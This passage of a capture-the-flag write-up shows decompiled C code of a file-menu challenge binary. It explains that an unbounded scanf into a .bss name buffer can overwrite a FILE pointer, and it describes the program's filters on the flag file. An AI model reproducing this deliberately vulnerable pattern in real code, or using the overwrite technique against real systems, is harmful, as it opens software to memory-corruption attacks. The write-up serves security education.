    __isoc99_scanf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,input_str);
    input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input_str);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;switch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input) {
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Invaild choice&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
      openfile();
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
      readfile();
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
      writefile();
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
      closefile();
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Leave your name :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* can overwrite fp *&#x2F;
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__isoc99_scanf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,name);
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Thank you &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt; ,see you next time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,name);
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
      }
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    }
  } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The use of &lt;code&gt;scanf&lt;&#x2F;code&gt; without a maximum width specified allows for a buffer overflow attack in the .bss section. Overflowing 
the &lt;code&gt;name&lt;&#x2F;code&gt; buffer allows us to overwrite &lt;code&gt;FILE *fp&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
&lt;h2 id=&quot;openfile&quot;&gt;openfile&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;openfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pcVar2;
  
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;memset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;What do you want to see :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    __isoc99_scanf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%63s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,filename);
    pcVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filename,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Danger !&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    }
    fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filename,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
      iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Open failed&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    }
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
      iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Open Successful&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    }
  }
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;You need to close the file first&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
  }
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This opens any file without &lt;code&gt;flag&lt;&#x2F;code&gt; in its name and stores its file descriptor (&lt;code&gt;FILE *&lt;&#x2F;code&gt;) in &lt;code&gt;fp&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;readfile&quot;&gt;readfile&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;readfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sVar1;
  
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;memset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;You need to open a file first&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  }
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
    sVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;399&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,fp);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(sVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Read Successful&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    }
  }
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This reads the next 399 characters of the previously opened file into a buffer in memory.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;writefile&quot;&gt;writefile&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;writefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pcVar1;
  
  pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filename,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
    pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;FLAG&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* ASCII &amp;#39;}&amp;#39; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;      pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strchr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf);
        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
      }
    }
  }
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;you can&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;t see it&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This prints the contents of the previously loaded memory buffer as long as it doesn&#x27;t contain &amp;quot;FLAG&amp;quot; or the character &#x27;}&#x27;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;closefile&quot;&gt;closefile&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;closefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

{
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Nothing need to close&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  }
